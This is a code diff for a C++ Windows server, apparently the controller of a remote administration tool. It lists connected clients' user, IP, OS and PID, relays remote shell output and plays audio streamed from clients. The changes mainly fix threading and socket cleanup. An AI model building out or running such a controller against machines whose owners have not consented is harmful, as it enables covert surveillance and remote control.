@@ -1,5 +1,3 @@
-//Vamo acete multi-thread :v
-
 #include "server.hpp"
 #include "misc.hpp"
 #include "frame_client.hpp"
@@ -12,12 +10,13 @@
 //Definir el servidor globalmente
 Servidor* p_Servidor;
 std::mutex vector_mutex;
+std::mutex count_mutex;
 
 bool Cliente_Handler::OpenPlayer() {
     WAVEFORMATEX wfx = {};
     wfx.wFormatTag = WAVE_FORMAT_PCM;
     wfx.nChannels = 2;
-    wfx.nSamplesPerSec = 22050;
+    wfx.nSamplesPerSec = 11025;
     wfx.wBitsPerSample = 16;
     wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
     wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;
@@ -66,19 +65,33 @@ void Cliente_Handler::Spawn_Handler(){
     this->isRunning = true;
     int iBufferSize = 1024 * 100;
     char *cBuffer = new char[iBufferSize];
-    while (this->isRunning) {
+    while (true) {
+
+        std::unique_lock<std::mutex> lock(this->mt_Running);
+        if (!this->isRunning || this->p_Cliente._sckCliente == INVALID_SOCKET) {
+            break;
+        }
+        lock.unlock();
+        
+        
         //Esperar por datos y procesarlos
         ZeroMemory(cBuffer, iBufferSize);
 
         int iRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, iBufferSize, 0, false);
+
+        if (iRecibido == WSAECONNRESET) {
+            this->Log("WSAECONNRESET");
+            break;
+        }
+
         if (WSAGetLastError() == WSAEWOULDBLOCK) {
             //No hay datos todavia, esperar un poco mas
+            
             Sleep(10);
             continue;
         }
 
         if (iRecibido <= 0 && GetLastError() != WSAEWOULDBLOCK) {
-            this->isRunning = false;
             //Si la ventana sigue abierta
             FrameCliente* temp_cli = (FrameCliente*)wxWindow::FindWindowByName(this->p_Cliente._id);
             if (temp_cli) {
@@ -129,12 +142,9 @@ void Cliente_Handler::Spawn_Handler(){
             structTmp._id = this->p_Cliente._id;
             structTmp._strIp = this->p_Cliente._strIp;
 
-            std::unique_lock<std::mutex> lock(p_Servidor->count_mutex);
             
-            p_Servidor->m_InsertarCliente(structTmp, p_Servidor->iCount++);
-            p_Servidor->iCount++;
+            p_Servidor->m_InsertarCliente(structTmp);
             
-            lock.unlock();
             continue;
         }
 
@@ -370,7 +380,7 @@ void Cliente_Handler::Spawn_Handler(){
     }
 
     this->Log("Funado");
-
+    this->isRunning = false;
 }
 
 void Cliente_Handler::EscribirSalidShell(std::string strSalida) {
@@ -384,6 +394,7 @@ void Cliente_Handler::EscribirSalidShell(std::string strSalida) {
 
 void Cliente_Handler::Spawn_Thread() {
     this->p_thHilo = std::thread(&Cliente_Handler::Spawn_Handler, this);
+    this->p_thHilo.detach();
 }
 
 //funcion que crea el frame principal para interactuar con el cliente
@@ -432,7 +443,7 @@ void Servidor::Init_Key() {
 }
 
 Servidor::Servidor(){
-    this->uiPuertoLocal = 31000;
+    this->uiPuertoLocal = 31337;
 
     //clase para logear
     this->m_txtLog = new MyLogClass();
@@ -528,12 +539,14 @@ void Servidor::m_JoinThreads() {
 
 void Servidor::m_StopHandler() {
     this->m_txtLog->LogThis("Apagando", LogType::LogError);
-    std::lock_guard<std::mutex> lock(this->p_mutex);
-    this->p_Escuchando = false;
+    {
+        std::lock_guard<std::mutex> lock(this->p_mutex);
+        this->p_Escuchando = false;
+    }
 }
 
 void Servidor::m_CerrarConexion(SOCKET& pSocket) {
-    if (pSocket != -1) {
+    if (pSocket != INVALID_SOCKET) {
         closesocket(pSocket);
         pSocket = INVALID_SOCKET;
     }
@@ -541,61 +554,65 @@ void Servidor::m_CerrarConexion(SOCKET& pSocket) {
 
 void Servidor::m_CerrarConexiones() {
     if (this->vc_Clientes.size() > 0) {
-        for (std::vector<Cliente_Handler*>::iterator it = this->vc_Clientes.begin(); it != this->vc_Clientes.end();) {
-            (*it)->isRunning = false;
-            this->m_CerrarConexion((*it)->p_Cliente._sckCliente);
-            it++;
+        for(int iIndex = 0; iIndex<int(this->vc_Clientes.size()); iIndex++){
+            this->m_CerrarConexion(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);
         }
     }
     
-    closesocket(this->sckSocket);
-    this->sckSocket = INVALID_SOCKET;
+    m_CerrarConexion(this->sckSocket);
     this->iCount = 0;
 }
 
 void Servidor::m_CleanVector() {
-    while (this->p_Escuchando) {
+    while (true) {
+        {
+            std::unique_lock<std::mutex> lock_1(this->p_mutex);
+            if (!this->p_Escuchando) {
+                break;
+            }
+        }
+
         Sleep(100);
         std::unique_lock<std::mutex> lock(vector_mutex);
         if (this->vc_Clientes.size() == 0) {
-            lock.unlock();
             continue;
         }
         
         for (std::vector<Cliente_Handler*>::iterator it = this->vc_Clientes.begin(); it != this->vc_Clientes.end();) {
-            if (!(*it)->isRunning) {
+            if (!(*it)->isRunning && this->p_Escuchando) {
                 this->m_CerrarConexion((*it)->p_Cliente._sckCliente);
-                (*it)->Join_Thread();
+                std::string streTempID = (*it)->p_Cliente._id;
+                lock.unlock();
 
-                this->m_RemoverClienteLista((*it)->p_Cliente._id);
+                this->m_RemoverClienteLista(streTempID);
+                
+                lock.lock();
                 std::string strTmp = "Cliente " + (*it)->p_Cliente._strIp + " - desconectado";
                 this->m_txtLog->LogThis(strTmp, LogType::LogMessage);
 
                 delete *it;
                 *it = nullptr;
                 it = this->vc_Clientes.erase(it);
-                std::unique_lock<std::mutex> lock2(this->count_mutex);
-                this->iCount--;
+                {
+                    std::unique_lock<std::mutex> lock2(this->count_mutex);
+                    this->iCount--;
+                }
             }else {
                 it++;
             }
         }
         lock.unlock();
     }
+    std::cout << "Thread CLEANER terminada\n";
+    
+    for (auto& cliente : this->vc_Clientes) {
+        cliente->Stop();
 
-    //Asegurarse :v
+        delete cliente;
+        cliente = nullptr;
 
-    std::unique_lock<std::mutex> lock2(vector_mutex);
-    for (std::vector<Cliente_Handler*>::iterator it = this->vc_Clientes.begin(); it != this->vc_Clientes.end();) {
-        
-        (*it)->isRunning = false;
-        this->m_CerrarConexion((*it)->p_Cliente._sckCliente);
-        (*it)->Join_Thread();
-        delete* it;
-        *it = nullptr;
-        it = this->vc_Clientes.erase(it);
     }
-    lock2.unlock();
+    this->vc_Clientes.clear();
 }
 
 void Servidor::m_Ping(){
@@ -772,16 +789,19 @@ int Servidor::IndexOf(std::string strID) {
     return iIndex;
 }
 
-void Servidor::m_InsertarCliente(struct Cliente& p_Cliente, int iIndex){
-    if (iIndex == -1) {
-        iIndex = 0;
-    }
-    m_listCtrl->InsertItem(iIndex, wxString(p_Cliente._id));
-    m_listCtrl->SetItem(iIndex, 1, wxString(p_Cliente._strUser));
-    m_listCtrl->SetItem(iIndex, 2, wxString(p_Cliente._strIp));
-    m_listCtrl->SetItem(iIndex, 3, wxString(p_Cliente._strSo));
-    m_listCtrl->SetItem(iIndex, 4, wxString(p_Cliente._strPID));
-    m_listCtrl->SetItem(iIndex, 5, wxString(p_Cliente._strCpu));
+void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
+    int iIndex = 0;
+    std::unique_lock<std::mutex> lock(this->count_mutex);
+    iIndex = this->iCount++;
+    lock.unlock();
+
+    this->m_listCtrl->InsertItem(iIndex, wxString(p_Cliente._id));
+    this->m_listCtrl->SetItem(iIndex, 1, wxString(p_Cliente._strUser));
+    this->m_listCtrl->SetItem(iIndex, 2, wxString(p_Cliente._strIp));
+    this->m_listCtrl->SetItem(iIndex, 3, wxString(p_Cliente._strSo));
+    this->m_listCtrl->SetItem(iIndex, 4, wxString(p_Cliente._strPID));
+    this->m_listCtrl->SetItem(iIndex, 5, wxString(p_Cliente._strCpu));
+
 }
 
 void Servidor::m_RemoverClienteLista(std::string p_ID){
